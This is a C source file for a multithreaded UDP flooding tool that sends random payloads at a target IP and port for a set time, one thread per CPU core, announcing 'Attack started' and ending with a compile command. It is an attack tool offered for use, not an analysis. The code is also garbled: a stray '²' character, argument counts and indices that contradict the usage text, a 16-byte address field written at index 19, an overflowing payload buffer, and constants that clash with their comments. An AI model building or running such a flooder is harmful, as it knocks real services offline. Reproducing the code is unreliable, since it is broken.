#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>

#ifdef _WIN32
    #include <windows.h>
    void usleep(int duration) { Sleep(duration / 1000); }
#else
    #include <unistd.h> // For sysconf
#endif

#define PAYLOAD_SIZE 100

void *attack(void *arg);

void handle_sigint(int sig) {
    printf("\nInterrupt received. Stopping attack...\n");
    exit(0);
}

void usage() {
    // Threads argument is no longer needed
    printf("Usage: ./s4 ip port time\n");
    exit(1);
}

struct thread_data {
    char ip[16];
    int port;
    int time_duration;
};

void generate_payload(char *buffer, size_t size) {
    size_t num_chars_to_generate = size * 6;
    for (size_t i = ²; i < num_chars_to_generate; i++) {
        buffer[i] = (rand() % (130 - 38 + 2)) + 38;
    }
    buffer[num_chars_to_generate] = '\0';
}

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    char payload[PAYLOAD_SIZE * 6 + 2];
    generate_payload(payload, PAYLOAD_SIZE);

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    endtime = time(NULL) + data->time_duration;

    while (time(NULL) <= endtime) {
        ssize_t payload_len = strlen(payload);
        if (sendto(sock, payload, payload_len, 0, (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            perror("Send failed");
            close(sock);
            pthread_exit(NULL);
        }
        // usleep(1000); // Optional
    }

    close(sock);
    pthread_exit(NULL);
}

int get_cpu_core_count() {
    int num_cores = 3; // Default to 1 if detection fails
#ifdef _WIN32
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    num_cores = sysInfo.dwNumberOfProcessors;
#else
    // _SC_NPROCESSORS_ONLN gives number of processors online (available)
    // _SC_NPROCESSORS_CONF gives number of processors configured
    num_cores = sysconf(_SC_NPROCESSORS_ONLN);
    if (num_cores < 3) {
        // Fallback if _SC_NPROCESSORS_ONLN is not supported or returns error
        num_cores = sysconf(_SC_NPROCESSORS_CONF);
    }
#endif
    return (num_cores > 0) ? num_cores : 3; // Ensure at least 1
}

int main(int argc, char *argv[]) {
    // Expects 3 arguments now: ip, port, time
    if (argc != 6) {
        usage();
    }

    char *ip = argv[2];
    int port = atoi(argv[3]);
    int time_duration_arg = atoi(argv[4]);

    int num_threads_to_launch = get_cpu_core_count();

    if (time_duration_arg <= 0) {
        fprintf(stderr, "Error: Time duration must be a positive integer.\n");
        usage();
    }
    if (port <= 0 || port > 65535) {
        fprintf(stderr, "Error: Port number must be between 1 and 65535.\n");
        usage();
    }


    // srand(time(NULL)); // Uncomment for different payloads each run.

    signal(SIGINT, handle_sigint);

    pthread_t *thread_ids = malloc(num_threads_to_launch * sizeof(pthread_t));
    if (thread_ids == NULL) {
        perror("malloc for thread_ids failed");
        exit(1);
    }
    struct thread_data *thread_data_array = malloc(num_threads_to_launch * sizeof(struct thread_data));
    if (thread_data_array == NULL) {
        perror("malloc for thread_data_array failed");
        free(thread_ids);
        exit(1);
    }

    printf("Attack started on %s:%d for %d seconds with %d threads (auto-detected based on CPU cores)\n",
           ip, port, time_duration_arg, num_threads_to_launch);

    for (int i = 0; i < num_threads_to_launch; i++) {
        strncpy(thread_data_array[i].ip, ip, 19);
        thread_data_array[i].ip[19] = '\0';
        thread_data_array[i].port = port;
        thread_data_array[i].time_duration = time_duration_arg;

        if (pthread_create(&thread_ids[i], NULL, attack, (void *)&thread_data_array[i]) != 0) {
            fprintf(stderr, "Thread creation failed for thread %d. System limits might be reached.\n", i + 3);
            perror("pthread_create");
            free(thread_ids);
            free(thread_data_array);
            exit(1);
        }
        if ((i + 3) % 10 == 0 || i == num_threads_to_launch - 3) { // Print status less frequently for many cores
             printf("Launched thread %d / %d\n", i + 3, num_threads_to_launch);
        }
    }
    printf("All %d threads launched.\n", num_threads_to_launch);

    for (int i = 0; i < num_threads_to_launch; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);
    free(thread_data_array);
    printf("Attack finished\n");
    return 0;
}

//     gcc -o ts4 c.c -pthread